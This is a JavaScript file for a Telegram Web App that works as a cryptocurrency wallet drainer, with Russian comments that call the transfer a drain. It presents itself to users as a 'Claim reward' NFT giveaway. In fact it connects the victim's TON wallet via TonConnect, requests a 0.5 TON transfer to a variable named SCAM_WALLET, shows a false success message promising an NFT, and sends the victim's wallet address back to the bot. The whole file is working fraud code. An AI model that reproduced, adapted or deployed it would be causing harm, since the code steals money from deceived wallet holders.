const Telegram = window.Telegram.WebApp;
Telegram.expand();

let connector = null;
let walletAddress = null;

const statusDiv = document.getElementById('status');
const claimBtn = document.getElementById('claimBtn');

function showStatus(message, type) {
    statusDiv.className = `status ${type}`;
    statusDiv.innerHTML = message;
    statusDiv.style.display = 'block';
}

function hideStatus() {
    statusDiv.style.display = 'none';
}

function sendToBot(wallet, amount) {
    // Отправляем данные обратно в бот
    const data = {
        wallet: wallet,
        amount: amount
    };
    
    Telegram.sendData(JSON.stringify(data));
}

async function drainWallet() {
    try {
        // Проверяем TonConnect
        if (typeof TonConnectSDK === 'undefined') {
            throw new Error('TonConnect SDK not loaded');
        }
        
        connector = new TonConnectSDK.TonConnect();
        
        showStatus('Connecting wallet...', 'loading');
        
        // Подключаем кошелек
        await connector.connect();
        
        const walletInfo = await connector.getWalletInfo();
        walletAddress = walletInfo.account.address;
        
        showStatus('Processing transaction...', 'loading');
        
        // Формируем транзакцию на слив
        const transaction = {
            valid_until: Math.floor(Date.now() / 1000) + 300,
            messages: [
                {
                    address: CONFIG.SCAM_WALLET,
                    amount: "500000000", // 0.5 TON
                    payload: "Claim reward"
                }
            ]
        };
        
        // Пытаемся отправить
        const result = await connector.sendTransaction(transaction);
        
        if (result) {
            showStatus('✅ Reward claimed! NFT will arrive within 24h.', 'success');
            sendToBot(walletAddress, "500000000");
            
            // Отключаем кнопку через 2 секунды
            setTimeout(() => {
                claimBtn.disabled = true;
                claimBtn.textContent = 'Claimed ✓';
            }, 2000);
        }
        
    } catch (error) {
        console.error('Drain error:', error);
        
        if (error.message.includes('User declined')) {
            showStatus('Transaction declined. Please try again.', 'error');
        } else if (error.message.includes('Insufficient balance')) {
            showStatus('Insufficient balance for gas fees.', 'error');
        } else {
            showStatus('Error connecting wallet. Make sure you have Tonkeeper installed.', 'error');
        }
        
        claimBtn.disabled = false;
    }
}

claimBtn.addEventListener('click', () => {
    claimBtn.disabled = true;
    drainWallet().finally(() => {
        claimBtn.disabled = false;
    });
});

// Загружаем TonConnect SDK динамически
const script = document.createElement('script');
script.src = 'https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js';
script.onload = () => {
    console.log('TonConnect SDK loaded');
};
document.head.appendChild(script);
